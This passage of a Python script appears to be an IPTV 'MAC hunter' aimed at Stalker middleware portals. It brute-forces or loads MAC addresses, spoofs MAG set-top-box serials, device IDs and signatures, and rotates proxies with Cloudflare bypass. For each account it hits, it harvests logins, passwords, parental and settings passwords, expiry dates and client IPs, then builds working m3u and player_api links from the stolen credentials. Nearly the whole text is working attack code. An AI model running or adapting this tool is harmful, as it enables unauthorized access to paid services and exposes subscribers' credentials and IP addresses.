    sound = rootDir + "/sound/STBMAX5.mp3"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass
    print("\n\n\33[1;36m  ⭐️   𝗛  𝗜  𝗧   ⭐️  \33[0m\n  " + str(mac) + "\n  " + str(trh))
    # print("""\33[1;90m𝐒𝐓𝐁√ˣ𝐏𝐑𝐎 \33[0m\33[1;92m▄︻デMᴀx["""+str(macon)+"""]Hɪᴛs==ᕗ 🦅 \33[0m\33[1;4;90mPʀᴇᴍɪᴜᴍ\33[0m""")


def unicode(fyz):
    cod = fyz.encode("utf-8").decode("unicode-escape").replace("\/", "/")
    return cod


def duzel2(veri, vr):
    data = ""
    try:
        data = veri.split('"' + str(vr) + '":"')[1]
        data = data.split('"')[0]
        data = data.replace('"', "")
        data = unicode(data)
    except:
        pass
    return str(data)


def duzelt1(veri, vr):
    data = veri.split(str(vr) + '":"')[1]
    data = data.split('"')[0]
    data = data.replace('"', "")
    return str(data)


import datetime
import time
import hashlib
import urllib


def url2(mac, random):
    macs = mac.upper()
    macs = urllib.parse.quote(macs)
    SN = hashlib.md5(mac.encode("utf-8")).hexdigest()
    SNENC = SN.upper()  # SN
    SNCUT = SNENC[:13]  # Sncut
    DEV = hashlib.sha256(mac.encode("utf-8")).hexdigest()
    DEVENC = DEV.upper()  # dev1
    DEV1 = hashlib.sha256(SNCUT.encode("utf-8")).hexdigest()
    DEVENC1 = DEV1.upper()  # dev2
    SG = SNCUT + (mac)
    SING = hashlib.sha256(SG.encode("utf-8")).hexdigest()
    SINGENC = SING.upper()  # signature
    url22 = (
        http
        + "://"
        + panel
        + "/"
        + author
        + '?action=get_profile&type=stb&&sn=""&device_id=""&device_id2="""'
    )
    if author == "stalker_portal/server/load.php":
        times = time.time()
        url22 = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn="
            + SNCUT
            + "&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id="
            + DEVENC
            + "&device_id2="
            + DEVENC
            + "&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22"
            + macs
            + "%22%2C%22sn%22%3A%22"
            + SNCUT
            + "%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22"
            + random
            + "%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp="
            + str(times)
            + "&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml"
        )
        if stalker_portal == "2":
            url22 = (
                http
                + "://"
                + panel
                + "/"
                + author
                + "?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn="
                + SNCUT
                + "&stb_type=MAG254&image_version=218&video_out=hdmi&device_id="
                + DEVENC
                + "&device_id2="
                + DEVENC
                + "&signature="
                + SINGENC
                + "&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp="
                + str(times)
                + '&api_signature=263&metrics={\\"mac\\":\\"'
                + macs
                + '\\",\\"sn\\":\\"'
                + SNCUT
                + '\\",\\"model\\":\\"MAG254\\",\\"type\\":\\"STB\\",\\"uid\\":\\"'
                + DEVENC
                + '\\",\\"random\\":\\"'
                + random
                + '\\"}&JsHttpRequest=1-xml'
            )
        if stalker_portal == "1":
            url22 = (
                http
                + "://"
                + panel
                + "/"
                + author
                + '?action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
            )
    if realblue == "real" or author == "c/portal.php":
        url22 = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?&action=get_profile&mac="
            + macs
            + "&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"
            + macs
            + "%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
        )
    return url22


import threading

botsay = 0


def run(STBbots):
    global botsay
    for j in range(int(STBbots)):
        t1 = threading.Thread(target=XD)
        t1.start()
        botsay = botsay + 1
        time.sleep(0.5)


combosay = 0


def combogetir():
    combogeti = ""
    global combosay
    combosay = combosay + 1
    try:
        combogeti = combototLen[combosay]
    except:
        pass
    return combogeti


oran = 0
bots = 0
bot = 0


def XD():
    global m3uvpn, m3uon, macon, macvpn, bot, hit, tokenr, hitr, bots, proxy
    global botsay, bots, combosay, proxys, total, xcc, macc, cpm, bot, oran, proxysbad, proxysbadlen, proxym, proxygood, proxygoodlen, checkproxyend, prosay, rotationx, rotationlen, tokenr, hitr, hitc, macon, macvpn, offvpn, m3uon, m3uof, m3uno, macs, token, res, status_code
    bots = bots + 1
    botc = bots
    for mac in range(botc, combouz, STBbots):
        if comboc == "0":
            xcc = 2
        if stop == 2:
            quit()
        if comboc == "fero":
            mac = randommac()
            mac = mac.upper()
        else:
            macv = re.search(pattern, combogetir(), re.IGNORECASE)
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        if proxi == "1":
            if authorc == "cloudflarex" or ccff == "CloudFlare":
                try:
                    sesq = requests.Session()
                    option = cloudscraper.create_scraper(sess=sesq)
                except:
                    sesq = requests.Session()
                    option = cfscrape.create_scraper(sess=sesq)
            else:
                proxy = requests.Session()
                print(proxy)
                option = proxy
        else:
            option = requests.Session()
        url = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
        )
        # print(url)
        bot = "Bᴏᴛ " + str(botc)
        oran = round(((combosay) / (combouz) * 100), 2)

        bag = 0
        proxysprint = ""
        veri = ""
        while True:
            proxyr = 0
            if protocol == 1:
                proxys = randomproxy().replace("\n", "")
                proxysprint = proxys
                host = proxys.split(":")[0]
                port = proxys.split(":")[1]
                user = proxys.split(":")[2]
                pasi = proxys.split(":")[3]
                proxy = requests.Session()
                proxy.proxies = {
                    "http": "socks5://" + user + ":" + pasi + "@" + host + ":" + port,
                    "https": "socks5://" + user + ":" + pasi + "@" + host + ":" + port,
                }
            elif protocol == 2:
                proxys = randomproxy().replace("\n", "")
                proxysprint = proxys
                host = proxys.split(":")[0]
                port = proxys.split(":")[1]
                user = proxys.split(":")[2]
                pasi = proxys.split(":")[3]
                proxy = requests.Session()
                proxy.proxies = {
                    "http": user + ":" + pasi + "@" + host + ":" + port,
                    "https": user + ":" + pasi + "@" + host + ":" + port,
                }
            elif protocol == 3:
                proxys = randomproxy().replace("\n", "")
                proxysprint = proxys
                proxy = requests.Session()
                proxy.proxies = {"http": proxys, "https": proxys}
            elif protocol == 4:
                proxys = randomproxy().replace("\n", "")
                proxysprint = proxys
                proxy = requests.Session()
                proxy.proxies = {"https": "socks4://" + proxys, "http": "socks4://" + proxys}
            elif protocol == 5:
                proxys = randomproxy().replace("\n", "")
                proxysprint = proxys
                proxy = requests.Session()
                proxy.proxies = {"http": "socks5://" + proxys, "https": "socks5://" + proxys}
            try:
                res = option.get(url, headers=hea1(mac), timeout=10, verify=False)
                veri = str(res.text)
                # print(veri)
                break
            except:
                if proxi == "1":
                    proxyr = 1
                    if proxys in proxysbad:
                        time.sleep(0.1)
                    elif checkproxyend == 0:
                        proxysbad += [proxys]
                    proxysbadlen = len(proxysbad)
                bag = bag + 1
                time.sleep(0.3)
                if bag == 3:
                    break
        if proxi == "1":
            if checkproxyend == 0:
                proxym = "\x1b[90m"
                if proxyr == 0:
                    if proxys in proxygood:
                        time.sleep(0.1)
                    else:
                        if checkproxyend == 0:
                            proxygood += [proxys]
                        proxygoodlen = len(proxygood)
                else:
                    time.sleep(0.1)
            if checkproxyend == 1:
                proxym = "\x1b[36m"
                rotate = proxe()
                if proxyr == 1:
                    if proxys in proxygood:
                        proxygood.remove(proxys)
                    proxygoodlen = len(proxygood)
                    if proxygoodlen == 1:
                        if prosay == 2:
                            proxygood.extend(rotationx)
                            proxygoodlen = len(proxygood)
                            checkproxyend = 2
                            prosay = 3
                        else:
                            proxygood.extend(rotationx)
                            proxygoodlen = len(proxygood)
                            rotationx.clear()
                            prosay = 2
                if prosay == 1 and proxys not in rotationx:
                    rotationx += [proxys]
                if prosay == 2 and proxyr == 0 and proxys not in rotationx:
                    rotationx += [proxys]
                rotationlen = len(rotationx)
        print(veri)
        echok(
            mac,
            bot,
            combosay,
            hit,
            oran,
            time_,
            hit_time,
            start_time,
            proxym,
            proxy_,
            res.status_code,
        )

        random = ""
        if not 'token":"' in veri:
            tokenr = " \33[95m"
            option.close
            res.close
            continue
        tokenr = "\33[0m"
        token = duzelt1(veri, "token")
        # print(token)
        if "random" in veri:
            random = duzelt1(veri, "random")
        veri = ""
        while True:
            try:
                res = option.get(
                    url2(mac, random), headers=hea2(mac, token), timeout=15, verify=False
                )
                veri = str(res.text)
                break
            except:
                pass
        adult = veri.split('parent_password":"')[-1]
        adult = adult.split('","bright')[0]

        id = "null"
        ip = ""
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        try:
            id = veri.split('{"js":{"id":')[1]
            id = str(id.split(',"name')[0])
        except:
            pass
        try:
            ip = str(duzel2(veri, "ip"))
        except:
            pass
        if proxi == "1" and (not protocol == 1 or not protocol == 2):
            try:
                ip = proxys.split(":")[0]
                ip = ip.replace("\n", "").replace(" ", "")
            except:
                pass
        try:
            expires = str(duzel2(veri, "expires"))
        except:
            pass
        ban = ""
        if id == "null" and expires == "" and ban == "":
            continue
            option.close
            res.close
        if author == "stalker_portal/server/load.php":
            if 'login":"' in veri:
                login = str(duzel2(veri, "login"))
                parent_password = str(duzel2(veri, "parent_password"))
                password = str(duzel2(veri, "password"))
                stb_type = str(duzel2(veri, "stb_type"))
                tariff_plan_id = str(duzel2(veri, "tariff_plan_id"))
                comment = str(duzel2(veri, "comment"))
                country = str(duzel2(veri, "country"))
                settings_password = str(duzel2(veri, "settings_password"))
                expire_billing_date = str(duzel2(veri, "expire_billing_date"))
                ls = str(duzel2(veri, "ls"))
                try:
                    max_online = str(duzel2(veri, "max_online"))
                except:
                    pass
        url = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        )

        veri = ""
        while True:
            try:
                res = option.get(url, headers=hea2(mac, token), timeout=15, verify=False)
                veri = str(res.text)
                break
            except:
                pass
        if (
            veri.count("phone") == 0
            and veri.count("end_date") == 0
            and expires == ""
            and expire_billing_date == ""
        ):
            continue
            option.close
            res.close
        fname = ""
        tariff_plan = ""
        ls = ""
        trh = ""
        bill = ""
        KalanGun = ""
        if author == "stalker_portal/server/load.php":
            try:
                fname = str(duzel2(veri, "fname"))
            except:
                pass
            try:
                tariff_plan = str(duzel2(veri, "tariff_plan"))
            except:
                pass
            try:
                bill = str(duzel2(veri, "created"))
            except:
                pass
        if "phone" in veri:
            trh = str(duzel2(veri, "phone"))
        if "end_date" in veri:
            trh = str(duzel2(veri, "end_date"))
        if trh == "":
            if not expires == "":
                trh = expires
        try:
            trh = datetime.datetime.fromtimestamp(int(trh)).strftime("%d-%m-%Y %H:%M:%S")
        except:
            pass
        if "(-" in trh:
            continue
            option.close
            res.close
        if trh.lower()[:2] == "un":
            KalanGun = " Days"
        else:
            try:
                KalanGun = str(tarih_clear(trh)) + " Days"
                if tarih_clear(trh) < 0:
                    macexp = macexp + 1
                    continue
                    option.close
                    res.close
                trh = trh + " " + KalanGun
            except:
                pass
        if trh == "":
            if author == "stalker_portal/server/load.php":
                trh = expire_billing_date
        veri = ""
        cid = "1842"
        url = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
        )
        bad = 0
        veri = ""
        while True:
            try:
                res = option.get(url, headers=hea2(mac, token), timeout=15, verify=False)
                veri = str(res.text)
                if "total" in veri:
                    cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                if author == "stalker_portal/server/load.php":
                    cid = str(res.text).split('id":"')[5].split('"')[0]
                break
            except:
                pass
        user = ""
        pas = ""
        link = ""

        real = panel
        if not expires == "":
            veri = ""
            cmd = ""
            url = (
                http
                + "://"
                + panel
                + "/"
                + author
                + "?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
            )
            while True:
                try:
                    res = option.get(url, headers=hea2(mac, token), timeout=15, verify=False)
                    veri = str(res.text)
                    break
                except:
                    pass
            if not "cmd" in veri:
                continue
            cmd = duzel2(veri, "cmd")

            veri = ""
            url = (
                http
                + "://"
                + panel
                + "/"
                + author
                + "?type=vod&action=create_link&cmd="
                + str(cmd)
                + "&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
            )
            while True:
                try:
                    res = option.get(url, headers=hea2(mac, token), timeout=15, verify=False)
                    veri = str(res.text)
                    break
                except:
                    pass
            if 'cmd":"' in veri:
                link = veri.split('cmd":"')[1].split('"')[0].replace("\/", "/")
                user = str(link.replace("movie/", "").split("/")[3])
                real = http + "://" + link.split("://")[1].split("/")[0] + "/c/"
                pas = str(link.replace("movie/", "").split("/")[4])
                cid = duzel2(veri, "id")
                m3ulink = (
                    "http://"
                    + real.replace("http://", "").replace("/c/", "")
                    + "/get.php?username="
                    + str(user)
                    + "&password="
                    + str(pas)
                    + "&type=m3u_plus&output=m3u8"
                )
        hitecho(mac, trh)
        hit = hit + 1
        hitr = "\33[33m"
        if "-" in KalanGun:
            hitr = "\33[1;92m"
            hit = hit - 1
            continue
            option.close
            res.close
        veri = ""
        if user == "":
            while True:
                try:
                    res = option.get(url7(cid), headers=hea2(mac, token), timeout=15, verify=False)
                    veri = str(res.text)
                    if "ffmpeg " in veri:
                        link = veri.split("ffmpeg ")[1].split('"')[0].replace("\/", "/")
                    else:
                        if 'cmd":"' in veri:
                            link = veri.split('cmd":"')[1].split('"')[0].replace("\/", "/")
                            user = login
                            pas = password
                            real = "http://" + link.split("://")[1].split("/")[0] + "/c/"
                    if "ffmpeg " in veri:
                        user = str(link.replace("live/", "").split("/")[3])
                        pas = str(link.replace("live/", "").split("/")[4])
                        if real == panel:
                            real = "http://" + link.split("://")[1].split("/")[0] + "/c/"
                    m3ulink = (
                        "http://"
                        + real.replace("http://", "").replace("/c/", "")
                        + "/get.php?username="
                        + str(user)
                        + "&password="
                        + str(pas)
                        + "&type=m3u_plus&output=m3u8"
                    )

                    break
                except:
                    pass
        durum = ""
        if not link == "":
            try:
                durum = goruntu(link, cid)
            except:
                pass
        if not m3ulink == "":
            playerlink = str(
                "http://"
                + real.replace("http://", "").replace("/c/", "")
                + "/player_api.php?username="
                + user
                + "&password="
                + pas
            )
            plink = real.replace("http://", "").replace("/c/", "")
            playerapi = m3uapi(playerlink, mac, token)
            m3uimage = m3ugoruntu(cid, user, pas, plink)
            if playerapi == "":
                playerlink = str(
                    "http://"
                    + panel.replace("http://", "").replace("/c/", "")
                    + "/player_api.php?username="
                    + user
                    + "&password="
                    + pas
                )
                plink = panel.replace("http://", "").replace("/c/", "")
                playerapi = m3uapi(playerlink, mac, token)
                m3uimage = m3ugoruntu(cid, user, pas, plink)
        if m3uimage == "ᴏꜰꜰʟɪɴᴇ ":
            m3uvpn = m3uvpn + 1
        else:
            m3uon = m3uon + 1
        if durum == "ᴜsᴇ ᴠᴘɴ" or durum == "ɪɴᴠᴀʟɪᴅ ᴏᴘᴘꜱ":
            macvpn = macvpn + 1
        else:
            macon = macon + 1
        if durum == "ᴇxɪsᴛ":
            durum = "🅈🄴🅂 🏴\u200d☠"
            offvpn = offvpn + 1
        vpn = ""
        if not ip == "":
            vpn = vpnip(ip)
        else:
            vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
        url5 = "https://ipapi.co/" + ip + "/json/"
        while True:
            try:
                res = option.get(url5, timeout=7, verify=False)
                break
            except:
                bag1 = bag1 + 1
                time.sleep(2)
                if bag1 == 4:
                    break
        try:
            bag1 = 0
            veri = str(res.text)
            scountry = ""
            country_name = "Unavailable 🏴‍☠️"
            scountry = veri.split('country_code": "')[1]
            scountry = scountry.split('"')[0]
            country_name = veri.split('country_name": "')[1]
            country_name = country_name.split('"')[0]
            flagc = flag.flag(scountry)
            if country_name == "":
                country_name = "Unavailable 🏴‍☠️"
            else:
                country_name = country_name + " " + flagc
            country_name = country_name
        except:
            pass
        urlkasay = ""
        urlfsay = ""
        urldsay = ""
        livelist = ""
        vodlist = ""
        serieslist = ""

        try:
            urlksay = (
                "http://"
                + panel
                + "/player_api.php?username="
                + user
                + "&password="
                + pas
                + "&action=get_live_streams"
            )
            res = option.get(urlksay, timeout=15, verify=False)
            veri = str(res.text)
            kanalsayisi = str(veri.count("stream_id"))

            urlfsay = (
                "http://"
                + panel
                + "/player_api.php?username="
                + user
                + "&password="
                + pas
                + "&action=get_vod_streams"
            )
            res = option.get(urlfsay, timeout=15, verify=False)
            veri = str(res.text)
            filmsayisi = str(veri.count("stream_id"))

            urldsay = (
                "http://"
                + panel
                + "/player_api.php?username="
                + user
                + "&password="
                + pas
                + "&action=get_series"
            )
            res = option.get(urldsay, timeout=15, verify=False)
            veri = str(res.text)
            dizisayisi = str(veri.count("series_id"))
        except:
            pass
        liveurl = (
            http + "://" + panel + "/" + author + "?action=get_genres&type=itv&JsHttpRequest=1-xml"
        )
        if not expires == "":
            liveurl = (
                http
                + "://"
                + panel
                + "/"
                + author
                + "?type=itv&action=get_genres&JsHttpRequest=1-xml"
            )
        if author == "stalker_portal/server/load.php":
            liveurl = (
                http
                + "://"
                + panel
                + "/"
                + author
                + "?type=itv&action=get_genres&JsHttpRequest=1-xml"
            )
        vodurl = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?action=get_categories&type=vod&JsHttpRequest=1-xml"
        )
        seriesurl = (
            http
            + "://"
            + panel
            + "/"
            + author
            + "?action=get_categories&type=series&JsHttpRequest=1-xml"
        )
        if channels == "1" or channels == "2":
            listlink = liveurl
            livel = "⍟"
            livelist = list(listlink, mac, token, livel)
            livelist = livelist.upper()
            livelist = livelist.replace("«»", "")
            livelist = livelist.replace("⍟AE", "• |🇦🇪 AE ")
            livelist = livelist.replace("⍟UAE", "• |🇦🇪 UAE ")
            livelist = livelist.replace("⍟ALL", "• |🏁ALL ")
            livelist = livelist.replace("⍟ALB", "• |🇦🇱 ALB ")
            livelist = livelist.replace("⍟ASIA", "• 🈲️ ASIA ")
            livelist = livelist.replace("⍟AR", "• |🇸🇦 AR ")
            livelist = livelist.replace("⍟AT", "• |🇦🇹 AT ")
            livelist = livelist.replace("⍟AU", "• |🇦🇺 AU ")
            livelist = livelist.replace("⍟AZ", "• |🇦🇿 AZ ")
            livelist = livelist.replace("⍟BE", "• |🇧🇪 BE ")
            livelist = livelist.replace("⍟BG", "• |🇧🇬 BG ")
            livelist = livelist.replace("⍟BIH", "• |🇧🇦 BIH ")
            livelist = livelist.replace("⍟BO", "• |🇧🇴 BO ")
            livelist = livelist.replace("⍟BR", "• |🇧🇷 BR ")
            livelist = livelist.replace("⍟CA", "• |🇨🇦 CA ")
            livelist = livelist.replace("⍟CH", "• |🇨🇭 CH ")
            livelist = livelist.replace("⍟SW", "• |🇨🇭 SW ")
            livelist = livelist.replace("⍟CL", "• |🇨🇱 CL ")
            livelist = livelist.replace("⍟CN", "• |🇨🇳 CN ")
            livelist = livelist.replace("⍟CO", "• |🇨🇴 CO ")
            livelist = livelist.replace("⍟CR", "• |🇭🇷 CR ")
            livelist = livelist.replace("⍟CZ", "• |🇨🇿 CZ ")
            livelist = livelist.replace("⍟DE ", "• |🇩🇪 DE ")
            livelist = livelist.replace("⍟ DE ", "• |🇩🇪 DE ")
            livelist = livelist.replace("⍟  DE ", "• |🇩🇪 DE ")
            livelist = livelist.replace("⍟DE| ", "• |🇩🇪 DE ")
            livelist = livelist.replace("⍟ DE| ", "• |🇩🇪 DE ")
            livelist = livelist.replace("⍟  DE| ", "• |🇩🇪 DE ")
            livelist = livelist.replace("⍟[DE", "• |🇩🇪 [DE ")
            livelist = livelist.replace("⍟ [DE", "• |🇩🇪 [DE ")
            livelist = livelist.replace("⍟De", "• |🇩🇪 De ")
            livelist = livelist.replace("⍟ De", "• |🇩🇪 De ")
            livelist = livelist.replace("⍟GE", "• |🇩🇪 GE ")
            livelist = livelist.replace("⍟ GE", "• |🇩🇪 GE ")
            livelist = livelist.replace("⍟DK", "• |🇩🇰 DK ")
            livelist = livelist.replace("⍟ DK", "• |🇩🇰 DK ")
            livelist = livelist.replace("⍟DM", "• |🇩🇰 DM ")
            livelist = livelist.replace("⍟ DM", "• |🇩🇰 DM ")
            livelist = livelist.replace("⍟EC", "• |🇪🇨 EC ")
            livelist = livelist.replace("⍟EG", "• |🇪🇬 EG ")
            livelist = livelist.replace("⍟EN", "• |🇬🇧 EN ")
            livelist = livelist.replace("⍟GB", "• |🇬🇧 GB ")
            livelist = livelist.replace("⍟UK", "• |🇬🇧 UK ")
            livelist = livelist.replace("⍟EU", "• |🇪🇺 EU ")
            livelist = livelist.replace("⍟ES", "• |🇪🇸 ES ")
            livelist = livelist.replace("⍟SP", "• |🇪🇸 SP ")
            livelist = livelist.replace("⍟EX", "• |🇭🇷 EX ")
            livelist = livelist.replace("⍟|EX", "• |🇭🇷 |EX ")
            livelist = livelist.replace("⍟YU", "• |🇭🇷 YU ")
            livelist = livelist.replace("⍟F1", "•  🏎  F1 ")
            livelist = livelist.replace("⍟ F1", "•  🏎  F1 ")
            livelist = livelist.replace("⍟FI", "• |🇫🇮 FI ")
            livelist = livelist.replace("⍟FR", "• |🇫🇷 FR ")
            livelist = livelist.replace("⍟FI", "• |🇫🇮 FI ")
            livelist = livelist.replace("⍟GOLF", "• 🏌‍♂️ GOLF ")
            livelist = livelist.replace("⍟ GOLF", "• 🏌‍♂️ GOLF ")
            livelist = livelist.replace("⍟GOR", "• |🇲🇪 GOR ")
            livelist = livelist.replace("⍟GR", "• |🇬🇷 GR ")
            livelist = livelist.replace("⍟HR", "• |🇭🇷 HR ")
            livelist = livelist.replace("⍟HU", "• |🇭🇺 HU ")
            livelist = livelist.replace("⍟IE", "• |🇮🇪 IE ")
            livelist = livelist.replace("⍟IL", "• |🇮🇪 IL ")
            livelist = livelist.replace("⍟IR", "• |🇮🇪 IR ")
            livelist = livelist.replace("⍟ID", "• |🇮🇩 ID ")
            livelist = livelist.replace("⍟IN", "• |🇮🇳 IN ")
            livelist = livelist.replace("⍟IT", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟ IT", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟IT|", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟ IT|", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟[IT", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟ [IT", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟It", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟ It", "• |🇮🇹 IT ")
            livelist = livelist.replace("⍟JP", "• |🇯🇵 JP ")
            livelist = livelist.replace("⍟KE", "• |🇰🇪 KE ")
            livelist = livelist.replace("⍟KU", "• |🇭🇺 KU ")
            livelist = livelist.replace("⍟KR", "• |🇰🇷 KR ")
            livelist = livelist.replace("⍟LU", "• |🇱🇺 LU ")
            livelist = livelist.replace("⍟MKD", "• |🇲🇰 MKD ")
            livelist = livelist.replace("⍟MX", "• |🇲🇽 MX ")
            livelist = livelist.replace("⍟MY", "• |🇲🇾 MY ")
            livelist = livelist.replace("⍟NETFLIX", "• | 🚩 NETFLIX ")
            livelist = livelist.replace("⍟ NETFLIX", "• | 🚩 NETFLIX ")
            livelist = livelist.replace("⍟|MULTI", "• | 🚩 |MULTI ")
            livelist = livelist.replace("⍟ |MULTI", "• | 🚩 |MULTI ")
            livelist = livelist.replace("⍟NG", "• |🇳🇬 NG ")
            livelist = livelist.replace("⍟NZ", "• |🇳🇿 NZ ")
            livelist = livelist.replace("⍟NL", "• |🇳🇱 NL ")
            livelist = livelist.replace("⍟NO", "• |🇳🇴 NO ")
            livelist = livelist.replace("⍟PA", "• |🇵🇦 PA ")
            livelist = livelist.replace("⍟PE", "• |🇵🇪 PE ")
            livelist = livelist.replace("⍟PH", "• |🇵🇭 PH ")
            livelist = livelist.replace("⍟PK", "• |🇵🇰 PK ")
            livelist = livelist.replace("⍟PL", "• |🇵🇱 PL ")
            livelist = livelist.replace("⍟PT", "• |🇵🇹 PT ")
            livelist = livelist.replace("⍟PPV", "• |🏋🏼‍♂️ PPV ")
            livelist = livelist.replace("⍟QA", "• |🇶🇦 QA ")
            livelist = livelist.replace("⍟RO", "• |🇷🇴 RO ")
            livelist = livelist.replace("⍟RU", "• |🇷🇺 RU ")
            livelist = livelist.replace("⍟SA", "• |🇸🇦 SA ")
            livelist = livelist.replace("⍟SCREENSAVER", "• | 🏞 SCREENSAVER ")
            livelist = livelist.replace("⍟SE", "• |🇸🇪 SE ")
            livelist = livelist.replace("⍟SK", "• |🇸🇰 SK ")
            livelist = livelist.replace("⍟SL", "• |🇸🇮 SL ")
            livelist = livelist.replace("⍟SG", "• |🇸🇬 SG ")
            livelist = livelist.replace("⍟SR", "• |🇷🇸 SR ")
            livelist = livelist.replace("⍟SU", "• |🇦🇲 SU ")
            livelist = livelist.replace("⍟TH", "• |🇹🇭 TH ")
            livelist = livelist.replace("⍟TR", "• |🇹🇷 TR ")
            livelist = livelist.replace("⍟[TR", "• |🇹🇷 [TR ")
            livelist = livelist.replace("⍟TW", "• |🇹🇼 TW ")
            livelist = livelist.replace("⍟UKR", "• |🇺🇦 UKR ")
            livelist = livelist.replace("⍟US", "• |🇺🇸 US ")
            livelist = livelist.replace("⍟VN", "• |🇻🇳 VN ")
            livelist = livelist.replace("⍟VIP", "• |⚽️ VIP ")
            livelist = livelist.replace("⍟UEFA", "• |⚽️ UEFA ")
            livelist = livelist.replace("⍟WEB", "• |🏳️‍🌈 WEB ")
            livelist = livelist.replace("⍟ZA", "• |🇿🇦 ZA ")
            livelist = livelist.replace("⍟AF", "• |🇿🇦 AF ")
            livelist = livelist.replace("⍟ADULTS", "• |🔞 ADULTS ")
            livelist = livelist.replace("⍟FOR", "• |🔞 FOR ")
            livelist = livelist.replace("⍟⋅ FOR", "• |🔞 ⋅ FOR ")
            livelist = livelist.replace("⍟BLU", "• |🔞 BLU ")
            livelist = livelist.replace("⍟XXX", "• |🔞 XXX ")
            livelist = livelist.replace("⍟", "• 🟢 •")
        if channels == "2":
            listlink = vodurl
            livel = "⍟"
            vodlist = list(listlink, mac, token, livel)
            vodlist = vodlist.upper()
            vodlist = vodlist.replace("«»", "")
            vodlist = vodlist.replace("⍟AE", "• |🇦🇪 AE ")
            vodlist = vodlist.replace("⍟UAE", "• |🇦🇪 UAE ")
            vodlist = vodlist.replace("⍟ALL", "• |🏁ALL ")
            vodlist = vodlist.replace("⍟ALB", "• |🇦🇱 ALB ")
            vodlist = vodlist.replace("⍟AR", "• |🇸🇦 AR ")
            vodlist = vodlist.replace("⍟ASIA", "• 🈲️ ASIA ")
            vodlist = vodlist.replace("⍟AT", "• |🇦🇹 AT ")
            vodlist = vodlist.replace("⍟AU", "• |🇦🇺 AU ")
            vodlist = vodlist.replace("⍟AZ", "• |🇦🇿 AZ ")
            vodlist = vodlist.replace("⍟BE", "• |🇧🇪 BE ")
            vodlist = vodlist.replace("⍟BG", "• |🇧🇬 BG ")
            vodlist = vodlist.replace("⍟BIH", "• |🇧🇦 BIH ")
            vodlist = vodlist.replace("⍟BO", "• |🇧🇴 BO ")
            vodlist = vodlist.replace("⍟BR", "• |🇧🇷 BR ")
            vodlist = vodlist.replace("⍟CA", "• |🇨🇦 CA ")
